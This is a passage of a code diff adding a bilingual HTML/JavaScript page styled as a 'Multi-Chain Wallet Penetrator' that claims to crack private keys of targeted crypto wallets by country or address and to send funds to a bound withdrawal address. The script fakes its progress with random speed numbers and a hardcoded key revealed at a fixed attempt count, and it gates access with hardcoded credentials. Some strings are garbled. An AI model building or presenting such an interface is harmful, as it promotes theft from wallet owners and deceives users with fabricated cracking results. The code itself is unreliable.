+       <thead style="position: sticky; top: 0; background: linear-gradient(135deg, rgba(30, 41, 59, 0.95), rgba(51, 65, 85, 0.95)); backdrop-filter: blur(10px); z-index: 10;">
+        <tr style="border-bottom: 2px solid rgba(251, 191, 36, 0.4);">
+         <th class="text-left px-6 py-4 text-sm font-bold opacity-90" style="width: 25%;" id="withdrawalTableNetworkHeader">网络</th>
+         <th class="text-left px-6 py-4 text-sm font-bold opacity-90" style="width: 55%;" id="withdrawalTableAddressHeader">出款地址</th>
+         <th class="text-center px-6 py-4 text-sm font-bold opacity-90" style="width: 20%;" id="withdrawalTableActionHeader">操作</th>
+        </tr>
+       </thead>
+       <tbody id="withdrawalTableBody">
+        <tr>
+         <td colspan="3" class="px-6 py-20 text-center">
+          <div class="text-5xl mb-4 opacity-30">
+           💰
+          </div>
+          <div class="text-lg font-semibold opacity-50" id="withdrawalTableEmpty">
+           列表为空
+          </div>
+          <div class="text-sm opacity-30 mt-2" id="withdrawalTableEmptyDesc">
+           暂无出款地址
+          </div></td>
+        </tr>
+       </tbody>
+      </table>
+     </div>
+    </section><!-- Favorite Address Section -->
+    <section class="glass-card rounded-3xl p-10 shadow-2xl fade-in mt-8">
+     <div class="mb-8">
+      <h2 class="text-3xl font-bold flex items-center"><span class="text-4xl mr-4 float-animation" style="animation-delay: 0.6s;">⭐</span> <span style="background: linear-gradient(135deg, #e2e8f0, #cbd5e1); -webkit-background-clip: text; -webkit-text-fill-color: transparent;" id="favoriteTitle">单独破解地址</span></h2>
+     </div><!-- Favorite Address Form -->
+     <div class="mb-8 p-6 rounded-2xl" style="background: linear-gradient(135deg, rgba(34, 211, 238, 0.08), rgba(139, 92, 246, 0.08)); border: 2px solid rgba(34, 211, 238, 0.3);">
+      <div class="grid grid-cols-1 md:grid-cols-4 gap-4 items-end mb-4">
+       <div><label class="block text-sm font-semibold mb-2 opacity-90" id="bindNetworkLabel">网络</label> <select id="bindNetwork" class="w-full px-4 py-3 rounded-xl text-base font-medium" style="background: rgba(15, 23, 42, 0.8); border: 2px solid rgba(99, 102, 241, 0.4); color: #e2e8f0; cursor: pointer;"> <option value="TRON">TRON</option> <option value="ETHEREUM">ETHEREUM</option> <option value="BITCOIN">BITCOIN</option> </select>
+       </div>
+       <div><label class="block text-sm font-semibold mb-2 opacity-90" id="bindAddressLabel">钱包地址</label> <input id="bindAddress" type="text" placeholder="输入钱包地址" class="w-full px-4 py-3 rounded-xl text-base" style="background: rgba(15, 23, 42, 0.8); border: 2px solid rgba(99, 102, 241, 0.4); color: #e2e8f0;">
+       </div>
+       <div><label class="block text-sm font-semibold mb-2 opacity-90" id="bindSpeedLabel">破解速度</label>
+        <div class="w-full px-4 py-3 rounded-xl text-base font-bold text-center" style="background: linear-gradient(135deg, rgba(236, 72, 153, 0.15), rgba(139, 92, 246, 0.15)); border: 2px solid rgba(236, 72, 153, 0.4); color: #ec4899;"><span id="favoriteSpeed">0</span> <span id="speedUnit">速度/秒</span>
+        </div>
+       </div>
+       <div><button id="transferBtn" class="w-full py-3 rounded-xl font-bold text-base text-white transition-all" style="background: linear-gradient(135deg, #22d3ee, #06b6d4); box-shadow: 0 4px 15px rgba(34, 211, 238, 0.4);"> 🔓 <span id="transferBtnText">开始破解</span> </button>
+       </div>
+      </div><!-- Private Key Generation Process for Favorites -->
+      <div><label class="block text-sm font-semibold mb-2 opacity-90" id="favoriteKeygenLabel">私钥破解过程</label>
+       <div id="favoriteKeygenProcess" class="rounded-xl p-4 mono-text" style="background: rgba(15, 23, 42, 0.9); border: 2px solid rgba(139, 92, 246, 0.4); min-height: 60px; max-height: 100px; overflow-y: auto; color: #a78bfa; font-size: 11px; line-height: 1.6;">
+        <div class="opacity-50 text-center py-4" id="favoriteKeygenEmpty">
+         等待添加破解地址...
+        </div>
+       </div>
+      </div>
+     </div><!-- Favorite Table Container -->
+     <div class="scroll-container" style="max-height: 500px;">
+      <table class="w-full">
+       <thead style="position: sticky; top: 0; background: linear-gradient(135deg, rgba(30, 41, 59, 0.95), rgba(51, 65, 85, 0.95)); backdrop-filter: blur(10px); z-index: 10;">
+        <tr style="border-bottom: 2px solid rgba(99, 102, 241, 0.4);">
+         <th class="text-left px-6 py-4 text-sm font-bold opacity-90" style="width: 20%;" id="tableNetworkHeader">网络</th>
+         <th class="text-left px-6 py-4 text-sm font-bold opacity-90" style="width: 35%;" id="tableAddressHeader">钱包地址</th>
+         <th class="text-left px-6 py-4 text-sm font-bold opacity-90" style="width: 35%;" id="tablePrivateKeyHeader">私钥</th>
+         <th class="text-center px-6 py-4 text-sm font-bold opacity-90" style="width: 10%;" id="tableActionHeader">操作</th>
+        </tr>
+       </thead>
+       <tbody id="bindingTableBody">
+        <tr>
+         <td colspan="4" class="px-6 py-20 text-center">
+          <div class="text-5xl mb-4 opacity-30">
+           📭
+          </div>
+          <div class="text-lg font-semibold opacity-50" id="tableEmpty">
+           列表为空
+          </div>
+          <div class="text-sm opacity-30 mt-2" id="tableEmptyDesc">
+           暂无破解地址
+          </div></td>
+        </tr>
+       </tbody>
+      </table>
+     </div>
+    </section>
+   </main><!-- Footer -->
+   <footer class="mt-20 py-8 text-center border-t" style="border-color: rgba(99, 102, 241, 0.2); background: rgba(15, 23, 42, 0.5);">
+    <p id="footerWarning" class="text-sm opacity-60 flex items-center justify-center gap-2"><span class="text-xl">⚠️</span> <span>前端2026钱包渗入器</span></p>
+   </footer>
+  </div><!-- End of Main Content -->
+  <script>
+    // Maximum retained entries per process log.
+    const MAX_LOG_ENTRIES = 300;
+
+    function trimLog(container, newestFirst = false) {
+      while (container.children.length > MAX_LOG_ENTRIES) {
+        const oldest = newestFirst ? container.lastElementChild : container.firstElementChild;
+        oldest.remove();
+      }
+    }
+
+    // Language translations
+    const translations = {
+      zh: {
+        // Login screen
+        loginTitle: '安全验证',
+        loginSubtitle: '请输入访问密码以继续',
+        memberIdLabel: '会员号',
+        memberIdPlaceholder: '请输入会员号',
+        passwordLabel: '访问密码',
+        passwordPlaceholder: '请输入密码',
+        loginErrorText: '会员号或密码错误，请重试',
+        loginBtnText: '验证登录',
+        loginBtnSuccess: '验证成功',
+        loginBtnFailed: '验证失败',
+        loginLangText: 'English',
+        
+        // Main header
+        mainTitle: '多链 钱包渗透器2026版',
+        langText: 'English',
+        connectBtnText: '连接后台',
+        connectingText: '正在连接...',
+        connectedText: '已连接',
+        connectSuccessTitle: '后台连接成功',
+        connectSuccessDesc: '已成功连接到远程服务器，系统功能已全部激活',
+        
+        // Left panel
+        systemPanelTitle: '渗透系统',
+        networkLabel: '区块链网络',
+        countryLabel: '🎯 目标国家/地区',
+        boosterTitle: '提速器',
+        boosterDesc: '开启后速度翻倍',
+        boosterEnabled: '提速器已启动',
+        boosterEnabledDesc: '破解速度已提升至 92-114/秒，正在加速生成中...',
+        boosterDisabled: '提速器已关闭',
+        boosterDisabledDesc: '恢复正常速度运行',
+        crackedLabel: '✅ 成功破解地址',
+        crackedEmpty: '暂无成功破解的地址...',
+        keygenLabel: '私钥生成过程',
+        keygenEmpty: '等待开始破解...',
+        startButtonText: '✨ 开始破解',
+        stopButtonText: '⏸️ 停止',
+        triesLabel: '尝试次数',
+        speedLabel: '速度 / 秒',
+        runtimeLabel: '运行时间',
+        
+        // Right panel
+        resultsPanelTitle: '渗透过程',
+        resultsEmpty: '等待开始破解...',
+        resultsEmptyDesc: '点击"开始破解"按钮启动破解程序',
+        addressLabel: '钱包地址',
+        privateKeyLabel: '私钥',
+        copyBtn: '📋 复制',
+        copiedBtn: '✓ 已复制',
+        copyFailedBtn: '❌ 失败',
+        crackedBadge: '✅ 已破解',
+        
+        // Withdrawal section
+        withdrawalTitle: '绑定出款地址',
+        withdrawalNetworkLabel: '网络',
+        withdrawalAddressLabel: '出款地址',
+        withdrawalAddressPlaceholder: '输入出款地址',
+        withdrawalBtnText: '添加地址',
+        withdrawalBtnWarning: '请填写出款地址',
+        withdrawalBtnSuccess: '添加成功',
+        withdrawalTableNetworkHeader: '网络',
+        withdrawalTableAddressHeader: '出款地址',
+        withdrawalTableActionHeader: '操作',
+        withdrawalTableEmpty: '列表为空',
+        withdrawalTableEmptyDesc: '暂无收款地址',
+        withdrawalDeleteBtn: ' 删除',
+        
+        // Favorite section
+        favoriteTitle: '单独破解地址',
+        bindNetworkLabel: '网络',
+        bindAddressLabel: '钱包地址',
+        bindAddressPlaceholder: '输入钱包地址',
+        bindSpeedLabel: '破解速度',
+        speedUnit: '速度/秒',
+        transferBtnText: '开始破解',
+        transferBtnWarning: '请填写地址',
+        transferBtnSuccess: '已添加',
+        favoriteKeygenLabel: '私钥破解过程',
+        favoriteKeygenEmpty: '等待添加破解地址...',
+        tableNetworkHeader: '网络',
+        tableAddressHeader: '钱包地址',
+        tablePrivateKeyHeader: '私钥',
+        tableActionHeader: '操作',
+        tableDeleteBtn: '🗑️ 删除',
+        tableEmpty: '列表为空',
+        tableEmptyDesc: '暂无破解地址',
+        crackingText: '正在破解中...',
+        
+        // Footer
+        footerWarning: '前端2026钱包渗入器',
+        
+        // Misc
+        offlineTitle: '网络已断开',
+        offlineDesc: '检测到网络连接中断，生成过程已自动停止'
+      },
+      en: {
+        // Login screen
+        loginTitle: 'Security Verification',
+        loginSubtitle: 'Please enter your credentials to continue',
+        memberIdLabel: 'Member ID',
+        memberIdPlaceholder: 'Enter member ID',
+        passwordLabel: 'Access Password',
+        passwordPlaceholder: 'Enter password',
+        loginErrorText: 'Invalid member ID or password, please try again',
+        loginBtnText: 'Verify Login',
+        loginBtnSuccess: 'Success',
+        loginBtnFailed: 'Failed',
+        loginLangText: '中文',
+        
+        // Main header
+        mainTitle: 'Multi-Chain Wallet Penetrator 2026',
+        langText: '中文',
+        connectBtnText: 'Connect Backend',
+        connectingText: 'Connecting...',
+        connectedText: 'Connected',
+        connectSuccessTitle: 'Backend Connected',
+        connectSuccessDesc: 'Successfully connected to remote server, all system functions activated',
+        
+        // Left panel
+        systemPanelTitle: 'Penetration System',
+        networkLabel: 'Blockchain Network',
+        countryLabel: '🎯 Target Country/Region',
+        boosterTitle: 'Speed Booster',
+        boosterDesc: 'Double speed when enabled',
+        boosterEnabled: 'Speed Booster Activated',
+        boosterEnabledDesc: 'Cracking speed increased to 92-114/sec, accelerating generation...',
+        boosterDisabled: 'Speed Booster Disabled',
+        boosterDisabledDesc: 'Returning to normal speed',
+        crackedLabel: '✅ Successfully Cracked Addresses',
+        crackedEmpty: 'No successfully cracked addresses yet...',
+        keygenLabel: 'Private Key Generation Process',
+        keygenEmpty: 'Waiting to start cracking...',
+        startButtonText: '✨ Start Cracking',
+        stopButtonText: '⏸️ Stop',
+        triesLabel: 'Attempts',
+        speedLabel: 'Speed / Sec',
+        runtimeLabel: 'Runtime',
+        
+        // Right panel
+        resultsPanelTitle: 'Penetration Process',
+        resultsEmpty: 'Waiting to start cracking...',
+        resultsEmptyDesc: 'Click "Start Cracking" button to launch the program',
+        addressLabel: 'Wallet Address',
+        privateKeyLabel: 'Private Key',
+        copyBtn: '📋 Copy',
+        copiedBtn: '✓ Copied',
+        copyFailedBtn: '❌ Failed',
+        crackedBadge: '✅ Cracked',
+        
+        // Withdrawal section
+        withdrawalTitle: 'Bind Withdrawal Address',
+        withdrawalNetworkLabel: 'Network',
+        withdrawalAddressLabel: 'Withdrawal Address',
+        withdrawalAddressPlaceholder: 'Enter withdrawal address',
+        withdrawalBtnText: 'Add Address',
+        withdrawalBtnWarning: 'Please fill address',
+        withdrawalBtnSuccess: 'Added',
+        withdrawalTableNetworkHeader: 'Network',
+        withdrawalTableAddressHeader: 'Withdrawal Address',
+        withdrawalTableActionHeader: 'Action',
+        withdrawalTableEmpty: 'List is empty',
+        withdrawalTableEmptyDesc: 'No withdrawal addresses',
+        withdrawalDeleteBtn: '🗑️ Delete',
+        
+        // Favorite section
+        favoriteTitle: 'Target Specific Address',
+        bindNetworkLabel: 'Network',
+        bindAddressLabel: 'Wallet Address',
+        bindAddressPlaceholder: 'Enter wallet address',
+        bindSpeedLabel: 'Crack Speed',
+        speedUnit: 'Speed/Sec',
+        transferBtnText: 'Start Cracking',
+        transferBtnWarning: 'Please fill address',
+        transferBtnSuccess: 'Added',
+        favoriteKeygenLabel: 'Private Key Cracking Process',
+        favoriteKeygenEmpty: 'Waiting to add target address...',
+        tableNetworkHeader: 'Network',
+        tableAddressHeader: 'Wallet Address',
+        tablePrivateKeyHeader: 'Private Key',
+        tableActionHeader: 'Action',
+        tableDeleteBtn: '🗑️ Delete',
+        tableEmpty: 'List is empty',
+        tableEmptyDesc: 'No target addresses',
+        crackingText: 'Cracking in progress...',
+        
+        // Footer
+        footerWarning: 'Frontend-generated wallets, do not use for real funds · For demo and learning purposes only',
+        
+        // Misc
+        offlineTitle: 'Network Disconnected',
+        offlineDesc: 'Network connection interrupted, generation process stopped automatically'
+      }
+    };
+    
+    let currentLang = 'zh';
+    
+    function switchLanguage(lang) {
+      currentLang = lang;
+      const t = translations[lang];
+      
+      // Update login screen
+      document.getElementById('loginTitle').textContent = t.loginTitle;
+      document.getElementById('loginSubtitle').textContent = t.loginSubtitle;
+      document.getElementById('memberIdLabel').textContent = t.memberIdLabel;
+      document.getElementById('memberId').placeholder = t.memberIdPlaceholder;
+      document.getElementById('passwordLabel').textContent = t.passwordLabel;
+      document.getElementById('password').placeholder = t.passwordPlaceholder;
+      document.getElementById('loginErrorText').textContent = t.loginErrorText;
+      document.getElementById('loginBtnText').textContent = t.loginBtnText;
+      document.getElementById('loginLangText').textContent = t.loginLangText;
+      
+      // Update main header
+      const mainTitleEl = document.getElementById('mainTitle');
+      if (lang === 'zh') {
+        mainTitleEl.innerHTML = '<span class="text-5xl float-animation">🔐</span><span>多链 <span class="gradient-text">钱包渗透器2026版</span></span>';
+      } else {
+        mainTitleEl.innerHTML = '<span class="text-5xl float-animation">🔐</span><span><span class="gradient-text">Multi-Chain Wallet Penetrator 2026</span></span>';
+      }
+      
+      document.getElementById('langText').textContent = t.langText;
+      document.getElementById('connectBtnText').textContent = t.connectBtnText;
+      
+      // Update left panel
+      document.getElementById('systemPanelTitle').innerHTML = `<span class="text-4xl mr-4 float-animation">⚙️</span><span style="background: linear-gradient(135deg, #e2e8f0, #cbd5e1); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">${t.systemPanelTitle}</span>`;
+      document.getElementById('networkLabel').textContent = t.networkLabel;
+      document.getElementById('countryLabel').textContent = t.countryLabel;
+      document.getElementById('boosterTitle').textContent = t.boosterTitle;
+      document.getElementById('boosterDesc').textContent = t.boosterDesc;
+      document.getElementById('crackedLabel').textContent = t.crackedLabel;
+      
+      const crackedEmptyEl = document.getElementById('crackedEmpty');
+      if (crackedEmptyEl) crackedEmptyEl.textContent = t.crackedEmpty;
+      
+      document.getElementById('keygenLabel').textContent = t.keygenLabel;
+      
+      const keygenEmptyEl = document.getElementById('keygenEmpty');
+      if (keygenEmptyEl) keygenEmptyEl.textContent = t.keygenEmpty;
+      
+      document.getElementById('startButtonText').textContent = t.startButtonText;
+      document.getElementById('stopButtonText').textContent = t.stopButtonText;
+      document.getElementById('triesLabel').textContent = t.triesLabel;
+      document.getElementById('speedLabel').textContent = t.speedLabel;
+      document.getElementById('runtimeLabel').textContent = t.runtimeLabel;
+      
+      // Update right panel
+      document.getElementById('resultsPanelTitle').innerHTML = `<span class="text-4xl mr-4 float-animation" style="animation-delay: 0.3s;">🎯</span><span style="background: linear-gradient(135deg, #e2e8f0, #cbd5e1); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">${t.resultsPanelTitle}</span>`;
+      
+      const resultsEmptyEl = document.getElementById('resultsEmpty');
+      if (resultsEmptyEl) resultsEmptyEl.textContent = t.resultsEmpty;
+      
+      const resultsEmptyDescEl = document.getElementById('resultsEmptyDesc');
+      if (resultsEmptyDescEl) resultsEmptyDescEl.textContent = t.resultsEmptyDesc;
+      
+      // Update favorite section
+      document.getElementById('favoriteTitle').textContent = t.favoriteTitle;
+      document.getElementById('bindNetworkLabel').textContent = t.bindNetworkLabel;
+      document.getElementById('bindAddressLabel').textContent = t.bindAddressLabel;
+      document.getElementById('bindAddress').placeholder = t.bindAddressPlaceholder;
+      document.getElementById('bindSpeedLabel').textContent = t.bindSpeedLabel;
+      document.getElementById('speedUnit').textContent = t.speedUnit;
+      document.getElementById('transferBtnText').textContent = t.transferBtnText;
+      document.getElementById('favoriteKeygenLabel').textContent = t.favoriteKeygenLabel;
+      
+      const favoriteKeygenEmptyEl = document.getElementById('favoriteKeygenEmpty');
+      if (favoriteKeygenEmptyEl) favoriteKeygenEmptyEl.textContent = t.favoriteKeygenEmpty;
+      
+      document.getElementById('tableNetworkHeader').textContent = t.tableNetworkHeader;
+      document.getElementById('tableAddressHeader').textContent = t.tableAddressHeader;
+      document.getElementById('tablePrivateKeyHeader').textContent = t.tablePrivateKeyHeader;
+      document.getElementById('tableActionHeader').textContent = t.tableActionHeader;
+      
+      const tableEmptyEl = document.getElementById('tableEmpty');
+      if (tableEmptyEl) tableEmptyEl.textContent = t.tableEmpty;
+      
+      const tableEmptyDescEl = document.getElementById('tableEmptyDesc');
+      if (tableEmptyDescEl) tableEmptyDescEl.textContent = t.tableEmptyDesc;
+      
+      // Update withdrawal section
+      document.getElementById('withdrawalTitle').textContent = t.withdrawalTitle;
+      document.getElementById('withdrawalNetworkLabel').textContent = t.withdrawalNetworkLabel;
+      document.getElementById('withdrawalAddressLabel').textContent = t.withdrawalAddressLabel;
+      document.getElementById('withdrawalAddress').placeholder = t.withdrawalAddressPlaceholder;
+      document.getElementById('withdrawalBtnText').textContent = t.withdrawalBtnText;
+      document.getElementById('withdrawalTableNetworkHeader').textContent = t.withdrawalTableNetworkHeader;
+      document.getElementById('withdrawalTableAddressHeader').textContent = t.withdrawalTableAddressHeader;
+      document.getElementById('withdrawalTableActionHeader').textContent = t.withdrawalTableActionHeader;
+      
+      const withdrawalTableEmptyEl = document.getElementById('withdrawalTableEmpty');
+      if (withdrawalTableEmptyEl) withdrawalTableEmptyEl.textContent = t.withdrawalTableEmpty;
+      
+      const withdrawalTableEmptyDescEl = document.getElementById('withdrawalTableEmptyDesc');
+      if (withdrawalTableEmptyDescEl) withdrawalTableEmptyDescEl.textContent = t.withdrawalTableEmptyDesc;
+      
+      // Update footer
+      document.getElementById('footerWarning').innerHTML = `<span class="text-xl">⚠️</span><span>${t.footerWarning}</span>`;
+    }
+    
+    // Login language switch
+    document.getElementById('loginLangSwitch').addEventListener('click', function() {
+      currentLang = currentLang === 'zh' ? 'en' : 'zh';
+      switchLanguage(currentLang);
+    });
+    
+    // Main language switch
+    document.getElementById('langSwitch').addEventListener('click', function() {
+      currentLang = currentLang === 'zh' ? 'en' : 'zh';
+      switchLanguage(currentLang);
+    });
+
+    // Default configuration
+    const defaultConfig = {
+      main_title: "多链 钱包渗透器2026版",
+      version_badge: "⚡ Pro Edition",
+      system_panel_title: "渗透系统",
+      network_label: "区块链网络",
+      start_button_text: "✨ 开始破解",
+      stop_button_text: "⏸️ 停止",
+      tries_label: "尝试次数",
+      speed_label: "速度 / 秒",
+      runtime_label: "运行时间",
+      results_panel_title: "渗透过程",
+      footer_warning: "前端2026钱包渗入器"
+    };
+
+    // Login functionality
+    const correctPassword = '898989';
+    const correctMemberId = 'demo2';
+    
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      const t = translations[currentLang];
+      const memberIdInput = document.getElementById('memberId');
+      const passwordInput = document.getElementById('password');
+      const loginError = document.getElementById('loginError');
+      const loginBtn = document.getElementById('loginBtn');
+      const loginBtnTextEl = document.getElementById('loginBtnText');
+      const memberId = memberIdInput.value.trim();
+      const password = passwordInput.value.trim();
+      
+      if (memberId === correctMemberId && password === correctPassword) {
+        loginBtnTextEl.textContent = t.loginBtnSuccess;
+        loginBtn.style.background = 'linear-gradient(135deg, #22c55e, #16a34a)';
+        loginBtn.disabled = true;
+        
+        setTimeout(() => {
+          document.getElementById('loginScreen').style.transition = 'opacity 0.5s ease-out';
+          document.getElementById('loginScreen').style.opacity = '0';
+          
+          setTimeout(() => {
+            document.getElementById('loginScreen').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'block';
+            document.getElementById('mainContent').style.opacity = '0';
+            
+            setTimeout(() => {
+              document.getElementById('mainContent').style.transition = 'opacity 0.5s ease-in';
+              document.getElementById('mainContent').style.opacity = '1';
+            }, 50);
+          }, 500);
+        }, 1000);
+      } else {
+        loginError.classList.remove('hidden');
+        memberIdInput.value = '';
+        passwordInput.value = '';
+        memberIdInput.style.borderColor = 'rgba(239, 68, 68, 0.6)';
+        passwordInput.style.borderColor = 'rgba(239, 68, 68, 0.6)';
+        memberIdInput.style.animation = 'shake 0.5s';
+        passwordInput.style.animation = 'shake 0.5s';
+        
+        loginBtnTextEl.textContent = t.loginBtnFailed;
+        loginBtn.style.background = 'linear-gradient(135deg, #ef4444, #dc2626)';
+        
+        setTimeout(() => {
+          loginBtnTextEl.textContent = t.loginBtnText;
+          loginBtn.style.background = '';
+          memberIdInput.style.borderColor = '';
+          passwordInput.style.borderColor = '';
+          memberIdInput.style.animation = '';
+          passwordInput.style.animation = '';
+        }, 2000);
+        
+        setTimeout(() => {
+          loginError.classList.add('hidden');
+        }, 3000);
+      }
+    });
+
+    // Country flag mapping
+    const countryFlags = {
+      'global': '🌍',
+      'us': '🇺🇸',
+      'cn': '🇨🇳',
+      'jp': '��🇵',
+      'kr': '🇰🇷',
+      'gb': '🇬🇧',
+      'de': '🇩🇪',
+      'fr': '🇫🇷',
+      'ca': '🇨🇦',
+      'au': '🇦🇺',
+      'sg': '🇸🇬',
+      'hk': '🇭🇰',
+      'tw': '🇹🇼',
+      'ru': '🇷🇺',
+      'in': '🇮🇳',
+      'br': '🇧🇷',
+      'mx': '🇲🇽',
+      'es': '🇪🇸',
+      'it': '🇮🇹',
+      'nl': '🇳🇱',
+      'se': '🇸🇪',
+      'ch': '🇨🇭',
+      'ae': '🇦🇪',
+      'sa': '🇸🇦',
+      'tr': '🇹🇷',
+      'za': '🇿🇦',
+      'th': '🇹🇭',
+      'vn': '🇻🇳',
+      'id': '🇮🇩',
+      'my': '🇲🇾',
+      'ph': '🇵🇭'
+    };
+
+    // Apply config to UI
+    async function onConfigChange(config) {
+      const mainTitleEl = document.getElementById('mainTitle');
+      if (mainTitleEl) {
+        const titleText = config.main_title || defaultConfig.main_title;
+        mainTitleEl.innerHTML = `
+          <span class="text-5xl float-animation">🔐</span>
+          <span>${titleText.replace('钱包渗透器2026���', '<span class="gradient-text">钱包渗透器2026版</span>')}</span>
+        `;
+      }
+      
+      const versionBadgeEl = document.getElementById('versionBadge');
+      if (versionBadgeEl) {
+        versionBadgeEl.textContent = config.version_badge || defaultConfig.version_badge;
+      }
+      
+      const systemPanelTitleEl = document.getElementById('systemPanelTitle');
+      if (systemPanelTitleEl) {
+        const titleText = config.system_panel_title || defaultConfig.system_panel_title;
+        systemPanelTitleEl.innerHTML = `
+          <span class="text-4xl mr-4 float-animation">⚙️</span>
+          <span style="background: linear-gradient(135deg, #e2e8f0, #cbd5e1); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">${titleText}</span>
+        `;
+      }
+      
+      const networkLabelEl = document.getElementById('networkLabel');
+      if (networkLabelEl) {
+        networkLabelEl.textContent = config.network_label || defaultConfig.network_label;
+      }
+      
+      const startButtonTextEl = document.getElementById('startButtonText');
+      if (startButtonTextEl) {
+        startButtonTextEl.textContent = config.start_button_text || defaultConfig.start_button_text;
+      }
+      
+      const stopButtonTextEl = document.getElementById('stopButtonText');
+      if (stopButtonTextEl) {
+        stopButtonTextEl.textContent = config.stop_button_text || defaultConfig.stop_button_text;
+      }
+      
+      const triesLabelEl = document.getElementById('triesLabel');
+      if (triesLabelEl) {
+        triesLabelEl.textContent = config.tries_label || defaultConfig.tries_label;
+      }
+      
+      const speedLabelEl = document.getElementById('speedLabel');
+      if (speedLabelEl) {
+        speedLabelEl.textContent = config.speed_label || defaultConfig.speed_label;
+      }
+      
+      const runtimeLabelEl = document.getElementById('runtimeLabel');
+      if (runtimeLabelEl) {
+        runtimeLabelEl.textContent = config.runtime_label || defaultConfig.runtime_label;
+      }
+      
+      const resultsPanelTitleEl = document.getElementById('resultsPanelTitle');
+      if (resultsPanelTitleEl) {
+        const titleText = config.results_panel_title || defaultConfig.results_panel_title;
+        resultsPanelTitleEl.innerHTML = `
+          <span class="text-4xl mr-4 float-animation" style="animation-delay: 0.3s;">🎯</span>
+          <span style="background: linear-gradient(135deg, #e2e8f0, #cbd5e1); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">${titleText}</span>
+        `;
+      }
+      
+      const footerWarningEl = document.getElementById('footerWarning');
+      if (footerWarningEl) {
+        footerWarningEl.innerHTML = `
+          <span class="text-xl">⚠️</span>
+          <span>${config.footer_warning || defaultConfig.footer_warning}</span>
+        `;
+      }
+    }
+
+    // Initialize Element SDK
+    if (window.elementSdk) {
+      window.elementSdk.init({
+        defaultConfig: defaultConfig,
+        onConfigChange: onConfigChange,
+        mapToCapabilities: (config) => ({
+          recolorables: [],
+          borderables: [],
+          fontEditable: undefined,
+          fontSizeable: undefined
+        }),
+        mapToEditPanelValues: (config) => {
+          return new Map([
+            ["main_title", config.main_title || defaultConfig.main_title],
+            ["version_badge", config.version_badge || defaultConfig.version_badge],
+            ["system_panel_title", config.system_panel_title || defaultConfig.system_panel_title],
+            ["network_label", config.network_label || defaultConfig.network_label],
+            ["start_button_text", config.start_button_text || defaultConfig.start_button_text],
+            ["stop_button_text", config.stop_button_text || defaultConfig.stop_button_text],
+            ["tries_label", config.tries_label || defaultConfig.tries_label],
+            ["speed_label", config.speed_label || defaultConfig.speed_label],
+            ["runtime_label", config.runtime_label || defaultConfig.runtime_label],
+            ["results_panel_title", config.results_panel_title || defaultConfig.results_panel_title],
+            ["footer_warning", config.footer_warning || defaultConfig.footer_warning]
+          ]);
+        }
+      });
+    }
+
+    let running = false;
+    let tries = 0, found = 0;
+    const demoRevealAt = 40098;
+    const demoPrivateKey = '013c661a8a83040839c88eff301820e5df5ca0e92b31be7bf5c57645c78ed2a3';
+    let demoRevealShown = false;
+    let lastTime = Date.now(), lastTries = 0;
+    let startTime = 0;
+    let runtimeInterval = null;
+    let currentSpeed = 0;
+    let offlineCheckInterval = null;
+    let favoriteSpeedInterval = null;
+    let favoriteCrackSpeed = 0;
+    
+    // Speed booster event listener
+    document.addEventListener('DOMContentLoaded', function() {
+      const speedBooster = document.getElementById('speedBooster');
+      speedBooster.addEventListener('change', function() {
+        if (running) {
+          const t = translations[currentLang];
+          const results = document.getElementById('results');
+          const boostDiv = document.createElement('div');
+          boostDiv.className = 'result-item rounded-2xl p-6 mb-4';
+          
+          if (this.checked) {
+            boostDiv.style.background = 'rgba(236, 72, 153, 0.15)';
+            boostDiv.style.border = '2px solid rgba(236, 72, 153, 0.5)';
+            boostDiv.style.borderLeft = '4px solid #ec4899';
+            
+            boostDiv.innerHTML = `
+              <div class="flex items-center gap-3 mb-2">
+                <span class="text-3xl">🚀</span>
+                <span class="text-lg font-bold" style="color: #ec4899;">${t.boosterEnabled}</span>
+              </div>
+              <div class="text-sm opacity-75">${t.boosterEnabledDesc}</div>
+            `;
+          } else {
+            boostDiv.style.background = 'rgba(100, 116, 139, 0.15)';
+            boostDiv.style.border = '2px solid rgba(100, 116, 139, 0.5)';
+            boostDiv.style.borderLeft = '4px solid #64748b';
+            
+            boostDiv.innerHTML = `
+              <div class="flex items-center gap-3 mb-2">
+                <span class="text-3xl">⏸️</span>
+                <span class="text-lg font-bold" style="color: #94a3b8;">${t.boosterDisabled}</span>
+              </div>
+              <div class="text-sm opacity-75">${t.boosterDisabledDesc}</div>
+            `;
+          }
+          
+          results.prepend(boostDiv);
+            trimLog(results, true);
+          
+          setTimeout(() => {
+            boostDiv.style.transition = 'all 0.5s ease-out';
+            boostDiv.style.opacity = '0';
+            boostDiv.style.transform = 'translateX(100px)';
+            setTimeout(() => {
+              boostDiv.remove();
+            }, 500);
+          }, 3000);
+        }
+      });
+    });
+
+    function stopGeneration() {
+      running = false;
+      document.getElementById('start').disabled = false;
+      document.getElementById('start').classList.remove('pulse-animation');
+      document.getElementById('stop').disabled = true;
+      
+      if (runtimeInterval) {
+        clearInterval(runtimeInterval);
+        runtimeInterval = null;
+      }
+      
+      if (offlineCheckInterval) {
+        clearInterval(offlineCheckInterval);
+        offlineCheckInterval = null;
+      }
+    }
+    
+    function showOfflineMessage() {
+      const t = translations[currentLang];
+      const results = document.getElementById('results');
+      const offlineDiv = document.createElement('div');
+      offlineDiv.className = 'result-item rounded-2xl p-6 mb-4';
+      offlineDiv.style.background = 'rgba(239, 68, 68, 0.15)';
+      offlineDiv.style.border = '2px solid rgba(239, 68, 68, 0.5)';
+      offlineDiv.style.borderLeft = '4px solid #ef4444';
+      
+      offlineDiv.innerHTML = `
+        <div class="flex items-center gap-3 mb-2">
+          <span class="text-3xl">⚠️</span>
+          <span class="text-lg font-bold" style="color: #ef4444;">${t.offlineTitle}</span>
+        </div>
+        <div class="text-sm opacity-75">${t.offlineDesc}</div>
+      `;
+      
+      results.prepend(offlineDiv);
+      trimLog(results, true);
+      
+      setTimeout(() => {
+        offlineDiv.remove();
+      }, 5000);
+    }
+
+    function updateStats() {
+      document.getElementById('tries').innerText = tries.toLocaleString();
+      
+      const now = Date.now();
+      const diff = (now - lastTime) / 1000;
+      if (diff >= 0.15) {
+        const speedBoosterEnabled = document.getElementById('speedBooster').checked;
+        
+        let minSpeed, maxSpeed;
+        if (speedBoosterEnabled) {
+          minSpeed = 92;
+          maxSpeed = 114;
+        } else {
+          minSpeed = 60;
+          maxSpeed = 90;
+        }
+        
